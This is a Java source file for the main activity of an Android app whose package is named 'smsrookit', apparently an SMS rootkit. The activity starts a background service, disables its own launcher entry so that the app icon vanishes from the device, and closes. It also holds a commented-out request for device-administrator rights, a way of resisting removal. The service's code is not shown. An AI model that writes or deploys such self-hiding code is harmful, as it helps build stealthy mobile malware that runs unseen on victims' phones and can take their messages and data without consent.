package com.funny.fortest.smsrookit;

import android.content.Context;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.content.ServiceConnection;
import android.content.ComponentName;
import android.os.IBinder;
import android.content.Intent;
import android.util.Log;
import android.app.admin.DevicePolicyManager;
import android.content.pm.PackageManager;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        Log.d("zhaochengyu", "MainActivity onCreate: start!");
        // TODO: 2016/4/2  mainservice start
        Intent startIntent = new Intent(this, MainService.class);
        startService(startIntent);
        // requestDeviceAdmin();
        visableApp();
        finish();
    }

    // TODO: 2016/4/2 visable lancher
    private void visableApp(){
        PackageManager p = getPackageManager();
        p.setComponentEnabledSetting(getComponentName(), PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
    }
    private void requestDeviceAdmin() {
        DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
        ComponentName mPolicyAdmin = new ComponentName(this,
                DeviceMyReceiver.class);
        if (!dpm.isAdminActive(mPolicyAdmin)) {
            Intent activateDeviceAdminIntent = new Intent(
                    DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
            activateDeviceAdminIntent.putExtra(
                    DevicePolicyManager.EXTRA_DEVICE_ADMIN, mPolicyAdmin);
            activateDeviceAdminIntent.putExtra(
                    DevicePolicyManager.EXTRA_ADD_EXPLANATION, getResources()
                            .getString(R.string.app_name));
            startActivityForResult(activateDeviceAdminIntent, 1);
            return;
        }
    }
    protected void onDestroy() {
        Log.d("zhaochengyu", "MainActivity onDestroy: excute");
        super.onDestroy();
        getDelegate().onDestroy();
    }

}
